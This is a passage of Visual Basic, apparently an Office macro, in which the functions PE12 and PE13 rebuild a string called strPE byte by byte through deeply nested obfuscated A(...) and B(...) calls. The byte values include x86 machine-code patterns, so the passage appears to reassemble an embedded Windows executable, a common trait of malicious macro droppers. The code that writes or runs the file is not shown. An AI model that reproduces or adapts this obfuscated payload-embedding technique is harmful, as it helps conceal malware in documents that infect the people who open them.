    strPE = B(A(A(B(A(A(A(B(A(B(A(B(A(A(A(B(A(B(A(A(A(B(A(B(A(A(B(A(A(A(B(A(B(A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(strPE, 238), "g"), 228), 1), 0), "z"), 0), 137), "}"), 16), 131), 141), 1), "~"), 20), "3"), 172), "j"), 4), 250), 15), "Q"), 193), 21), "h"), 193), "@"), 0), 131), 196), ",3"), 210), "l"), 167), 181), 13), "x"), 165), "@"), 161), "3"), 192), 25), 153), "W"), 9), 138), "'A")

    PE11 = strPE
End Function

Private Function PE12() As String
   Dim strPE As String

    strPE = ""
    strPE = A(A(A(A(B(A(A(B(A(B(A(A(B(A(A(A(B(A(B(A(B(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(strPE, 131), 224), 4), ";"), 194), 175), "?"), 15), 190), 208), 131), 236), "0G"), 137), 148), 16), 139), 21), "t"), 193), 191), 0), 137), "M"), 240), 131), ":"), 1), "~"), 21), "3"), 192), "j"), 4), 138), 7), "P"), 209), 21), "h"), 156), "@"), 0), 139), "M"), 242), 204), 149), 8)
    strPE = B(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(B(strPE, "d"), 17), 161), "x"), 193), "@"), 0), "3"), 210), 177), 23), 139), 0), 138), 252), 130), 131), 224), 197), 133), 192), "t%"), 15), 190), 23), 141), 12), 137), "G"), 141), "LJ"), 208), 235), 187), 128), "?*u"), 128), 139), 3), 131), 195), 4), "G3"), 201), ";")
    strPE = A(A(A(B(A(B(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(B(A(B(A(B(A(A(B(A(A(B(A(A(A(A(strPE, 194), 253), 156), 193), "I#"), 200), 137), "M"), 240), 137), "}"), 16), "j"), 160), "hT"), 244), "@"), 0), "W"), 255), 223), 219), 193), "@"), 194), 182), 196), 151), 133), 192), 187), "7"), 138), 7), "<qu"), 18), "3"), 220), "c"), 235), "1"), 137), "U"), 240), 235), 219)
    strPE = A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(strPE, 137), 156), 204), 137), "U"), 228), 235), 211), "<lu"), 240), 184), 1), 0), 0), 17), "G"), 235), 24), "<hu"), 21), 184), 2), 0), 0), 0), "G"), 235), "6"), 184), 3), "5"), 0), 204), 235), 8), "3"), 11), 131), 199), 3), 137), "}"), 16), 139), "U"), 16)
    strPE = A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(A(strPE, 138), 10), 15), 190), 249), 131), 255), "x"), 15), 135), 221), 6), "*"), 0), "3"), 210), 138), 151), 218), "|@"), 0), 255), "$"), 149), 246), "{@"), 134), 133), 241), "u"), 34), 139), "K"), 4), 141), "U"), 252), 139), "y"), 247), 141), 244), 172), 131), 13), 8), "R"), 141)
    strPE = B(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(B(A(B(A(B(A(A(B(A(B(strPE, "U"), 208), "Rj"), 178), 8), "P"), 30), "r"), 13), "J"), 0), 131), 196), 24), 235), "4"), 131), "qdt"), 16), 131), 248), "Iu"), 233), 131), 195), 4), "3"), 192), "f^C"), 145), 15), 5), 139), "bt"), 195), 4), 141), "M"), 252), 141), "U"), 172), "Q")
    strPE = A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(strPE, 141), "M"), 208), "R]j"), 1), "P"), 178), "E"), 216), 232), 220), 12), 0), 0), 131), 196), 20), 139), "1BE"), 228), 133), "e"), 15), 132), 183), 3), 0), "D"), 139), "E"), 240), 141), "P"), 1), 129), 202), 0), 2), 0), 0), "r"), 5), 184), 255), 137), 0)
    strPE = B(A(B(A(A(B(A(B(A(A(A(B(A(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(B(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(strPE, 0), 160), ">"), 252), 15), 131), 159), 3), "."), 0), 133), 198), 6), "0"), 208), "M"), 252), "A0"), 200), 137), "M"), 252), "+"), 241), 10), 139), 3), "t"), 0), 133), 244), 145), " "), 139), "K"), 4), 141), "U"), 252), 139), 3), "R"), 160), "U"), 172), 131), "g"), 8), "R")
    strPE = B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(strPE, 141), 202), 208), "Rj"), 0), "QP"), 232), 219), "g"), 0), 0), 131), 196), 24), 235), "{"), 131), 248), 1), 141), "N"), 131), 248), "PuY"), 15), 191), 3), 131), 195), 159), "8"), 145), 146), 144), 131), 195), 4), 141), "x"), 252), 227), ":"), 172), 170), 13), "[")
    strPE = A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(B(strPE, "0RQ="), 0), "P"), 137), "E'wH"), 25), "&"), 130), 131), 196), 20), 139), 240), 204), "E"), 228), 133), 192), "t'"), 146), "N"), 8), 141), "P"), 1), 129), 250), 0), 2), 0), 0), "r"), 5), 184), 226), 251), 0), 0), "9E"), 252), "s"), 15)
    strPE = B(A(B(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(B(A(B(strPE, "N"), 198), "rJ/M"), 207), "A;"), 155), 192), "L"), 252), "rM"), 139), "E"), 208), 133), 192), 15), 2), 253), 1), 0), 0), 198), "E"), 251), "-M"), 212), 2), 0), 0), 133), 192), "u"), 31), 197), "S"), 217), "d"), 3), 141), "u"), 252), "("), 11), "Y")
    strPE = B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(strPE, "V"), 141), "u"), 172), "VQj"), 3), "RP"), 232), 211), 16), 0), 0), 131), 196), 24), 235), "."), 139), 248), 1), "t"), 16), 131), 248), 207), 180), 11), 151), 195), 4), "3"), 192), 19), 139), "C"), 252), 235), 5), 139), 244), 134), 195), 4), 141), 152), 252), "R")
    strPE = A(A(B(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(B(A(strPE, 141), "U"), 172), 5), "0j"), 3), "P"), 232), "o"), 16), 0), "r"), 131), 196), 20), 139), 240), "IE"), 228), 133), 192), "t0"), 139), 127), 240), 141), "H"), 1), 129), 249), 0), 2), "h"), 0), "M"), 5), 184), 255), 1), "%"), 0), "9E"), 240), "s"), 15), 200)
    strPE = A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(B(A(B(A(B(A(B(A(B(strPE, "|"), 6), "0"), 139), "M"), 252), "A;"), 200), "|"), 241), 252), "r"), 241), 210), 138), 212), 158), "6"), 15), 132), "d"), 2), 0), 0), 128), ">0r"), 218), 183), 2), "F"), 0), 175), 198), 6), "0"), 233), "K"), 2), 0), 0), 133), 192), "u"), 31), 139), 176), 4)
    strPE = A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(B(A(A(A(strPE, 139), 3), 141), "uh"), 131), 195), 132), "V=u"), 172), "VQj"), 237), "RP"), 232), "5"), 16), 0), 0), 131), 206), 24), 235), "."), 19), ","), 1), "t"), 12), 241), 248), 2), 251), 11), 131), 195), 4), "3"), 19), "f"), 139), "C"), 252), 235), "6"), 139)
    strPE = A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(strPE, 199), 131), 195), 4), 141), "("), 194), "R"), 1), "U"), 172), "RQj"), 4), "P"), 232), 181), 31), 0), 0), 127), 196), "J"), 190), 191), 30), "E"), 228), 133), 192), "t'!E"), 240), 141), "H"), 1), 129), 249), 0), 2), 0), 185), "r"), 5), 184), "x"), 1)
    strPE = A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(A(strPE, 0), 0), "9E"), 226), "s"), 15), "N"), 198), 6), 187), 0), 131), 252), "A;"), 200), 137), "M"), 252), "r"), 241), 139), 12), 212), 128), 192), 15), 132), 198), 231), 0), 143), 139), "EK"), 133), 192), 15), 132), 187), 1), 0), 0), 139), "U"), 16), "NN"), 153)
    strPE = A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(strPE, 2), 136), "F"), 1), 198), 6), "0"), 139), "<"), 252), 131), 192), 2), 233), 160), 1), "h"), 0), 139), "3"), 131), 195), 4), 133), 246), " "), 132), "K"), 3), 183), 0), 139), 3), 228), 133), 192), "u"), 24), 139), 175), 131), 227), 16), 20), 192), 27), "V"), 23), " "), 3)
    strPE = B(A(A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(B(A(A(A(strPE, 174), 247), 209), "I"), 137), 177), 252), 143), "w"), 1), 0), 0), "&M"), 240), ":"), 210), 133), 201), 139), "l"), 137), "U"), 252), 15), 134), 163), 3), 0), 4), 21), "84"), 15), 132), 154), 135), 0), 0), "@B;"), 209), 228), "U"), 252), "r"), 238), 198), "E")
    strPE = A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(B(strPE, "{"), 199), 233), "J"), 1), "6"), 183), 221), 3), 139), "E"), 228), 131), 195), 8), 221), "]"), 180), 133), 192), 184), 6), 0), 0), 0), 13), 3), 227), "E"), 199), 141), "U"), 252), "R{"), 149), 173), 253), 255), 255), "R"), 133), "U"), 208), "~"), 161), "U"), 184), "P"), 139)
    strPE = A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(A(A(B(A(B(strPE, "E"), 247), "P"), 139), 217), 180), "q"), 0), "Q"), 232), 162), 12), 0), "Y"), 158), 240), 139), "E"), 208), 131), 196), " "), 133), 192), "t"), 11), 198), "E"), 251), "-"), 233), 224), 0), "K"), 178), ">E"), 196), 133), "F#"), 9), 198), "EZ+"), 233), 208), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(strPE, 0), 139), "T"), 200), 133), 192), 15), 132), 225), 0), 0), 0), 146), "E"), 251), " 7"), 188), 0), 0), 0), 139), "E"), 233), 133), 192), 240), 7), 184), 6), 0), 0), 0), 235), 12), 139), 150), 240), 229), 192), "u"), 8), 189), 1), 0), 152), 0), 137), 164), 240)
    strPE = A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(strPE, 241), "M"), 212), 141), 144), 173), 253), 255), 255), 221), 3), "Q"), 153), 195), 8), "RP"), 131), 236), 8), 221), 28), "$"), 232), 224), 160), 0), 0), 139), "i"), 131), ","), 20), 128), ">-u"), 7), 198), "E"), 251), 245), "F"), 235), 24), 139), 160), 196), 133), 192)
    strPE = A(B(A(B(A(A(B(A(B(A(B(A(A(A(B(A(A(A(B(A(B(A(A(B(A(B(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(B(A(B(A(A(B(strPE, "t"), 6), 198), "E"), 251), "+"), 235), 250), 139), "E"), 200), "m"), 192), 214), 4), 217), "E"), 254), " "), 212), 254), 131), "{"), 235), "3"), 192), 242), ")"), 139), "E"), 180), 203), 209), "I"), 133), 192), 137), "M"), 203), "t"), 34), "j.V"), 255), 21), "|"), 193), "@"), 198)
    strPE = A(A(B(A(A(A(B(A(A(B(A(B(A(A(B(A(B(A(A(B(A(A(B(A(A(A(B(A(B(A(A(A(B(A(A(B(A(A(A(A(A(strPE, 131), 196), 8), 133), 23), "u"), 18), 139), "o"), 252), 156), 3), "0.(EF@"), 137), "E"), 213), 198), 4), "0"), 0), 154), "M"), 16), 128), "9Gu"), 19), "jeV"), 255), 21), "|"), 193), "@"), 0), 131), "y"), 8), 133), 137), "t"), 208), 198)
    strPE = B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(B(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(A(B(A(B(A(strPE, 0), "E"), 138), "E"), 18), 132), 192), "t"), 28), 211), 254), 160), 194), "@"), 0), "t"), 160), 141), "E"), 234), ";bM"), 30), 138), "M"), 251), "N"), 136), 14), "OE"), 252), "@"), 137), 221), 252), 139), "E"), 204), 133), 192), 15), 17), 1), 3), 235), 243), 131), "}")
    strPE = A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(B(A(A(A(A(strPE, 166), 1), 15), 133), "D"), 2), 0), 0), 139), "V"), 224), 139), "E"), 252), ";"), 198), 15), 179), 233), 2), 0), 0), 128), "}"), 23), "0"), 15), 133), 153), 2), 193), 0), 138), 204), 251), 132), 192), 15), 132), 142), 2), "4"), 0), 139), 203), 244), 139), "}"), 218), 133)
    strPE = B(A(B(A(B(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(B(A(B(A(strPE, 192), "t&;E"), 220), "r"), 25), "W"), 137), 7), 255), "U"), 8), 0), 196), 4), "A"), 248), 6), 133), 186), 3), 0), 0), "pO"), 4), 139), 7), 137), "M"), 220), 138), 22), 136), 16), "@"), 136), "E"), 244), 139), "U|"), 139), "M"), 224), "B"), 28), "P")
    strPE = A(A(A(B(A(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(B(A(A(B(strPE, "U"), 236), 139), "U"), 252), "JI"), 137), "U"), 252), 137), "M"), 251), 233), "I"), 2), 193), 0), 138), 19), 131), 129), 4), 136), "U"), 234), 141), "u"), 234), 199), "E"), 252), 1), 0), 0), 0), 198), "E"), 23), " "), 233), "b"), 255), 171), 255), "PE"), 234), 29), 141)
    strPE = A(A(B(A(B(A(B(A(A(B(A(A(A(B(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(B(strPE, "u"), 234), 199), "E"), 252), 1), 0), 194), 0), 198), "E"), 23), " "), 233), "K"), 255), 255), 255), 150), 195), 2), 133), 192), "u"), 24), 139), "E"), 236), 139), "K"), 252), "5"), 137), 1), 218), "E"), 188), 0), 161), "z"), 0), 137), "Q`"), 233), ","), 201), "8"), 255), 131)
    strPE = A(A(A(A(B(A(B(A(A(A(A(A(B(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(B(A(A(B(A(A(strPE, 248), 242), "u"), 20), 139), "S"), 252), "zE"), 236), 199), "E"), 188), 0), 0), 0), 0), 137), "y"), 233), 19), 255), 255), 255), 131), 248), 160), "u"), 22), 4), "K"), 252), "f"), 157), 205), "}"), 199), "E"), 188), 0), 0), 0), 160), "f"), 137), "2"), 24), 248), 254), 255)
    strPE = A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(strPE, 12), 130), "L"), 252), 139), "M"), 236), 20), "E"), 188), 0), 0), 199), 186), 137), 8), 233), 228), 254), 255), 255), 139), "E"), 16), "@"), 137), "E"), 16), 138), "7,"), 190), 200), 131), "Rt"), 15), 135), "c"), 1), 0), "(3"), 210), 138), 147), 164), 24), "@"), 0)
    strPE = A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(B(A(A(B(A(B(A(B(A(B(A(B(A(A(B(A(A(B(A(A(A(B(A(A(B(A(strPE, 255), "$"), 149), 128), "|@?"), 139), 3), 141), "M"), 252), 131), "K"), 4), 141), "U"), 172), "Q"), 13), "jxj"), 4), "PY:"), 12), "H"), 0), 131), "p"), 19), 139), 240), 250), "E"), 23), " O"), 155), 138), 6), "0"), 139), 3), 157), 195), 4), 133)
    strPE = A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(strPE, 192), 197), 132), 225), 0), 0), "2"), 141), "M"), 252), 141), 162), 172), "QRg"), 232), 224), 9), 0), 0), 139), 240), 139), "Ed"), 131), 4), 12), 133), 192), 15), 236), ":"), 0), 214), 2), 228), "E"), 240), 139), 253), 246), ";"), 193), 15), 131), 152), 0), 249)
    strPE = B(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(strPE, 226), 137), "@"), 252), 198), "E"), 23), " ^"), 199), 130), 255), 231), 180), 3), 131), 195), 4), 133), 192), "t"), 127), 141), 9), 252), "(U"), 172), "QRP"), 232), 128), 8), 0), "}"), 235), 189), 139), 3), 131), "a"), 4), 133), 190), "tfE"), 16), "q")
    strPE = A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(B(A(B(A(B(A(A(A(A(B(A(A(A(A(A(strPE, 141), 172), 253), 255), 255), "5"), 255), 244), 0), 0), "QR"), 232), "dP"), 10), "T"), 139), "P"), 131), 201), 255), "%"), 254), "3"), 192), 242), 174), 247), 243), 188), 198), "E"), 23), " "), 137), "M"), 252), 233), 6), 254), 255), "["), 139), 3), 131), 195), 4), 133), 192)
    strPE = A(A(A(A(B(A(A(A(A(B(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(B(A(A(B(A(B(strPE, "t/"), 141), "M"), 7), 141), "U"), 172), "QzP"), 232), "P"), 9), 0), 0), 233), "j"), 255), 255), 255), "/"), 241), 131), 195), 4), 133), 192), "t"), 19), 192), "M"), 252), 141), "U"), 206), "QR]"), 232), "T"), 12), 0), 0), 233), "N"), 255), 255), 255), 190)
    strPE = A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(A(B(A(A(strPE, 160), 194), "@"), 0), 199), "_"), 252), 6), 0), "i"), 0), 198), "E"), 23), " "), 233), 199), 253), 255), 255), 131), 195), 4), "<Bu"), 192), 139), "C}"), 20), 192), "t"), 22), 139), 0), 235), 20), "<F"), 227), 241), "?K"), 252), 133), 201), "t"), 7), 139)
    strPE = A(B(A(A(B(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(B(strPE, "4"), 139), "I"), 4), 235), 30), "3"), 192), "3"), 201), 141), "UKRQP"), 232), 231), 222), 255), 255), 139), 240), 197), "X"), 255), 139), 254), "3"), 192), 242), 174), 247), 209), "I"), 198), 139), 23), " "), 137), 243), 252), 233), "l"), 253), ":"), 255), 190), "R"), 193)
    strPE = A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(B(strPE, "@"), 0), 199), "E"), 252), 8), 0), 0), 0), 198), "E"), 251), 202), 131), "iH"), 233), "T"), 253), "8"), 193), 198), "E"), 234), 147), 29), "M"), 235), 141), 240), 234), 199), "E"), 252), 2), 0), 0), 0), 198), "E"), 23), 186), 233), ":"), 240), 190), 248), 139), "}"), 12)
    strPE = A(A(B(A(A(B(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(B(A(A(A(B(A(strPE, 139), "E"), 244), 133), 192), "t':"), 160), 220), "r"), 165), "W"), 25), 7), 255), "U"), 213), 131), 196), 4), 133), 15), 15), 157), "Nd"), 127), 0), 139), 230), 4), 139), 7), 137), "M"), 220), "yx"), 23), 136), 16), "/"), 137), "E"), 228), 139), "M"), 132), 139)
    strPE = A(B(A(B(A(B(A(A(B(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(B(A(A(B(A(B(A(B(strPE, "U"), 252), "A"), 137), "M"), 236), 139), "M"), 240), "I;"), 202), 137), "M"), 224), 133), 192), 25), "E"), 188), 131), 248), 1), 139), "E"), 228), "u"), 128), 139), "}"), 252), 177), 255), 251), "H"), 133), 192), "t4;Trr'"), 139), "E"), 12), "]M"), 244)
    strPE = A(B(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(strPE, 15), 249), 8), 255), "U"), 8), 131), 232), 4), 133), 138), 15), 133), 166), "N"), 0), 0), 139), "/"), 12), 139), "t"), 139), "@"), 4), 137), "E"), 247), 137), 186), 244), 194), 194), 138), 14), 136), 8), "@"), 137), "E"), 244), 139), "M"), 236), "AFO"), 137), "M"), 236)
    strPE = A(A(A(A(B(A(B(A(B(A(B(A(A(B(A(B(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(B(strPE, "u"), 222), 139), 154), 204), 133), 7), 18), "X"), 139), "M"), 192), 133), 201), "uQ"), 139), 160), 224), "SM"), 252), ";"), 209), "v"), 141), 133), 192), "t.;E"), 220), "r 4}"), 12), 149), "E"), 244), "W"), 137), "f"), 255), "U"), 8), 131), 196), 4)
    strPE = A(B(A(A(B(A(A(A(A(B(A(B(A(A(B(A(B(A(B(A(A(B(A(B(A(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(A(strPE, 133), 192), "uO"), 139), 236), 246), 252), 4), 137), "M"), 244), "eUa"), 224), 193), "NM\"), 136), 31), "@aE"), 244), "yM"), 236), 142), "U"), 252), "A"), 137), "M"), 236), 173), "M"), 224), "I;"), 202), 137), 231), 224), "m"), 185), 255), "E"), 13)
    strPE = A(B(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(strPE, 139), "U"), 16), 138), 2), 132), 192), 15), "y\"), 245), 255), 255), 139), "M"), 12), 139), "E"), 244), "_"), 133), 1), 139), "E"), 144), 158), "["), 139), 229), "]"), 194), 16), 0), "_^"), 131), 200), 255), "[2"), 229), "]"), 194), 16), 0), 144), 162), "{@"), 0)
    strPE = B(A(A(B(A(A(B(A(A(A(B(A(B(A(A(A(B(A(A(B(A(B(A(A(A(A(B(A(A(B(A(A(B(strPE, "}x@"), 0), 149), "v@"), 0), 7), "w"), 6), 30), 1), 201), "@}bx@"), 203), "Tt@"), 0), 148), "x@o7t@"), 0), 251), 133), "@"), 0), "<v@"), 0), 189), 226), "@"), 0), 139), "z@"), 0), 0), "a")
    strPE = A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(strPE, 12), 12), 12), 12), "J"), 156), "|"), 217), 28), 12), 12), 12), 12), 184), 12), 12), 12), 12), "g"), 12), 12), 12), 12), 12), 12), 239), 12), 12), "n"), 12), "_"), 12), 12), 12), 140), 1), 12), 227), 12), 12), 12), 176), 12), 12), 204), "1"), 209), 167), 12), 203)
    strPE = A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 153), 12), 173), 12), 12), 12), 12), 12), 12), 12), 12), 12), 12), 243), 12), 12), 12), 8), "e"), 3), 12), 12), 12), 12), 12), 12), 12), 12), "6"), 12), 12), 188), 12), 12), 12), 209), 4), 12), 12), 12), 12), 12), 12), 12), 12), 12), 12), 5), "1"), 24)

    PE12 = strPE
End Function

Private Function PE13() As String
   Dim strPE As String

    strPE = ""
    strPE = A(A(B(A(A(B(A(A(B(A(A(B(A(B(A(B(A(B(A(A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 2), 3), 191), 135), 189), 12), 12), 12), 7), 8), 27), 12), 12), 10), "I"), 11), 12), 12), "`"), 220), "I"), 236), 162), "{@"), 0), 137), "y@"), 0), "&"), 212), "@"), 0), "Dy@"), 0), 217), "y@"), 0), 162), "Z<"), 0), 31), "y"), 23), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(strPE, "Py@"), 0), "sz@"), 0), 0), 138), 8), 8), 4), 8), 34), 193), 8), 8), 8), 21), 8), "C"), 8), 8), 8), 8), 8), 8), 144), 8), 8), 161), 144), 8), 10), 8), 8), 8), 8), 8), 8), 8), 8), 8), 8), 8), 8), 8), 8), 8)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 8), 174), 8), 8), 8), 8), 8), 8), 8), 8), 8), 8), 8), 8), 8), 8), 8), 8), 8), 8), 8), 8), 8), 1), 2), 8), 8), 8), 2), 8), 8), 3), 8), 8), ";"), 8), 8), 155), 8), 8), 8), 2), 216), 180), 8), 8), 8), 8), 8), 8)
    strPE = B(A(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(strPE, 162), 8), 8), 8), 8), 8), 168), "7"), 8), 8), 8), 135), 8), 8), 8), 145), 8), "u"), 8), 8), 6), 8), 8), 8), 224), 144), 144), 144), 144), 144), 144), 254), "U"), 139), 236), 131), 236), "X"), 193), 141), "E"), 168), 245), "."), 144), 16), 141), "M<P")
    strPE = B(A(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(B(A(strPE, 139), "."), 12), 141), "U"), 1), 247), 217), 139), 8), "RWPQ"), 201), "{"), 1), 0), 0), 173), "M"), 226), "-U"), 20), 131), 196), 24), 137), "a"), 248), 133), 201), 139), 242), "t"), 6), 198), 2), 203), 141), ":"), 1), "GO"), 255), "D"), 133), 201), "~")
    strPE = A(A(B(A(B(A(A(A(B(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(A(strPE, 15), 128), "<"), 13), "0u"), 6), "O"), 231), 243), 201), 127), 244), "l}"), 16), 139), 217), 12), 247), 219), 15), 245), 180), 0), "(P"), 139), 203), "+"), 207), 131), 249), "G"), 15), 11), "b$"), 0), "R"), 133), 219), 127), ";"), 128), "80t"), 4), 198)
    strPE = A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(strPE, 6), ".F"), 133), 219), "}."), 139), 203), 184), 135), "000"), 243), 217), 137), "M"), 12), 211), "'"), 139), "7"), 193), 233), "M"), 243), 171), 139), 202), "C"), 225), 3), 222), 170), 139), "}"), 16), 139), 194), 139), "U"), 20), 3), 216), 3), 240), 139), 150), 140)
    strPE = A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(A(A(B(A(B(A(B(A(A(A(B(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(A(B(strPE, "o]"), 12), 185), 1), 0), 0), 0), ";"), 249), "|"), 22), 205), 247), 136), 22), "F@;"), 203), "u"), 202), 221), 6), ".F"), 158), ";"), 207), "~"), 237), 139), 31), 130), ";"), 178), "}"), 34), "+"), 223), 184), "00V0"), 139), 203), 139), 254), 139)
